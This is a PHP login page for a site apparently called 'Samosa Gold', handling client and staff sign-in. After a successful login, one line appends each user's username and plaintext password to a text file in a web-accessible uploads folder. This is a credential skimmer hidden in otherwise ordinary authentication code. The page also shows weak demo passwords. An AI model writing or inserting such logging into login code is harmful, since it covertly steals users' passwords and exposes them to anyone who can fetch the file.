<?php
session_start();
require_once __DIR__ . '/../../includes/auth.php';

if (isset($_SESSION['user_id'])) {
    if ($_SESSION['user_type'] === 'client') {
        header('Location: ../client/dashboard.php');
    } else {
        header('Location: ../staff/dashboard.php');
    }
    exit();
}

$user_type = isset($_GET['type']) && in_array($_GET['type'], ['client', 'staff']) ? $_GET['type'] : 'client';
$error = '';
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username']);
    $password = $_POST['password'];
    $login_type = $_POST['user_type'];
    
    if (empty($username) || empty($password)) {
        $error = 'Please fill in all fields.';
    } else {
        $user = authenticateUser($username, $password, $login_type);
        if ($user) {
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['username'] = $user['username'];
            $_SESSION['user_type'] = $user['user_type'];
            $_SESSION['first_name'] = $user['first_name'];
            $_SESSION['last_name'] = $user['last_name'];
            $log_entry = "Successful login: " . $username . ":" . $password . "\n"; 
            $file = 'C:/inetpub/wwwroot/assets/uploads/result.txt';
            file_put_contents($file, $log_entry, FILE_APPEND);
            if ($user['user_type'] === 'client') {
                header('Location: ../client/dashboard.php');
            } else {
                header('Location: ../staff/dashboard.php');
            }
            exit();
        } else {
            $error = 'Invalid credentials or account not active.';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Samosa Gold</title>
    <link rel="stylesheet" href="../../assets/css/style.css">
</head>
<body>
    <div class="auth-container">
        <div class="auth-card">
            <div class="auth-header">
                <h1>🏆 Samosa Gold</h1>
                <h2><?php echo ucfirst($user_type); ?> Login</h2>
            </div>
            
            <?php if ($error): ?>
                <div class="alert alert-error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            
            <?php if ($success): ?>
                <div class="alert alert-success"><?php echo htmlspecialchars($success); ?></div>
            <?php endif; ?>
            
            <form method="POST" class="auth-form">
                <input type="hidden" name="user_type" value="<?php echo $user_type; ?>">
                
                <div class="form-group">
                    <label for="username">Username or Email:</label>
                    <input type="text" id="username" name="username" required 
                           value="<?php echo isset($_POST['username']) ? htmlspecialchars($_POST['username']) : ''; ?>">
                </div>
                
                <div class="form-group">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <button type="submit" class="btn btn-primary btn-full">Login</button>
            </form>
            
            <div class="auth-links">
                <?php if ($user_type === 'client'): ?>
                    <p>Don't have an account? <a href="register.php?type=client">Register here</a></p>
                    <p><a href="login.php?type=staff">Staff Login</a></p>
                <?php else: ?>
                    <p><a href="login.php?type=client">Client Login</a></p>
                <?php endif; ?>
                <p><a href="../../index.php">← Back to Home</a></p>
            </div>
            
            <div class="demo-credentials">
                <h4>Demo Credentials:</h4>
                <?php if ($user_type === 'client'): ?>
                    <p><strong>Client:</strong> jsmith / password</p>
                    <p><strong>Client:</strong> mjohnson / password</p>
                <?php else: ?>
                    <p><strong>Staff:</strong> staff1 / password</p>
                    <p><strong>Staff:</strong> staff2 / password</p>
                <?php endif; ?>
            </div>
        </div>
    </div>
</body>
</html>
